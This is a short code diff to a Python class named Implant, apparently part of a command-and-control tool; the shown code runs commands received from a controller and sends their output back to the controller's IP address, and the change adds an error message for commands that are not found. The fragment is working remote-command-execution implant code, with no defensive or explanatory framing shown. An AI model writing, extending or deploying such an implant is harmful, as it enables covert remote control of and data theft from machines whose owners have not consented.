@@ -22,11 +22,12 @@ class Implant(Host):
             cmd = shellpack['data'].decode()
             cmd = cmd.split(" ")
             output = check_output(cmd, stderr=STDOUT, timeout=3)
-            # output = base64.b64encode(output)
             
             self.send(self.controller_ip, "instruction", output)
         except TimeoutExpired:
             self.send(self.controller_ip, "instruction", b'The command has timed out', option="ERROR")
+        except FileNotFoundError:
+            self.send(self.controller_ip, "instruction", f"The command {cmd[0]} has not been found".encode(), option="ERROR")
 
 if __name__ == "__main__":
     print("[ Setting up implant... ]")
